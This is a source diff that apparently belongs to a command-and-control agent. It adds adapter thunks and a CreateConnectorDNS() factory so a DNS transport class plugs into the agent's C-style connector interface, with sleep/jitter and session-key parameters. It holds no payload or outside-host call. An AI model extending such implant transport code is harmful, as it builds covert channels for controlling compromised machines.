@@ -1730,3 +1730,81 @@ BOOL ConnectorDNS::IsBusy() const
 {
     return (this->downBuf != NULL) || this->hasPendingTasks;
 }
+
+/*
+ * ConnectorDNS is the only class-based transport. The other four flavours
+ * (HTTP/SMB/TCP/WS) fill a plain `Connector` struct with file-scope thunks that
+ * take an explicit `Connector* self`; MainAgent.cpp drives every flavour through
+ * that same C interface (`g_Connector->SetProfile(g_Connector, ...)`), so a
+ * class instance has to be adapted back onto it. A member function already
+ * receives the object as its implicit first argument, which is exactly what the
+ * interface passes as `self` -- but the pointer type and the x86 calling
+ * convention (`__thiscall` vs `__cdecl`) differ, so the adapters are written out
+ * rather than cast.
+ *
+ * Without this the DNS flavour has no CreateConnectorDNS() at all, even though
+ * MainAgent.cpp declares and calls it, so every `dns` build dies in the linker
+ * with "undefined reference to `CreateConnectorDNS()'".
+ */
+
+static BOOL ConnectorDNS_SetProfileAdapter(Connector* self, void* profile, BYTE* beat, ULONG beatSize)
+{
+    return ((ConnectorDNS*)self)->SetProfile(profile, beat, beatSize);
+}
+
+static void ConnectorDNS_ExchangeAdapter(Connector* self, BYTE* plainData, ULONG plainSize, BYTE* sessionKey)
+{
+    ((ConnectorDNS*)self)->Exchange(plainData, plainSize, sessionKey);
+}
+
+static BYTE* ConnectorDNS_RecvDataAdapter(Connector* self)
+{
+    return ((ConnectorDNS*)self)->RecvData();
+}
+
+static int ConnectorDNS_RecvSizeAdapter(Connector* self)
+{
+    return ((ConnectorDNS*)self)->RecvSize();
+}
+
+static void ConnectorDNS_RecvClearAdapter(Connector* self)
+{
+    ((ConnectorDNS*)self)->RecvClear();
+}
+
+static void ConnectorDNS_SleepAdapter(Connector* self, HANDLE wakeupEvent, ULONG workingSleep, ULONG sleepDelay, ULONG jitter, BOOL hasOutput)
+{
+    ((ConnectorDNS*)self)->Sleep(wakeupEvent, workingSleep, sleepDelay, jitter, hasOutput);
+}
+
+static void ConnectorDNS_CloseAdapter(Connector* self)
+{
+    ((ConnectorDNS*)self)->CloseConnector();
+}
+
+Connector* CreateConnectorDNS()
+{
+    ConnectorDNS* dns = new ConnectorDNS();
+    if (!dns)
+        return NULL;
+
+    Connector* conn = (Connector*)dns;
+
+    /* The class keeps all of its state in members, so instanceData stays unused. */
+    conn->instanceData      = NULL;
+    conn->SetProfile        = ConnectorDNS_SetProfileAdapter;
+    conn->Exchange          = ConnectorDNS_ExchangeAdapter;
+    conn->RecvData          = ConnectorDNS_RecvDataAdapter;
+    conn->RecvSize          = ConnectorDNS_RecvSizeAdapter;
+    conn->RecvClear         = ConnectorDNS_RecvClearAdapter;
+    conn->Sleep             = ConnectorDNS_SleepAdapter;
+    conn->CloseConnector    = ConnectorDNS_CloseAdapter;
+
+    /* DNS is connectionless: there is nothing to wait for, and the channel is
+     * considered usable until the agent itself stops. */
+    conn->WaitForConnection = Connector_DefaultWaitForConnection;
+    conn->IsConnected       = Connector_DefaultIsConnected;
+    conn->Disconnect        = Connector_DefaultDisconnect;
+
+    return conn;
+}
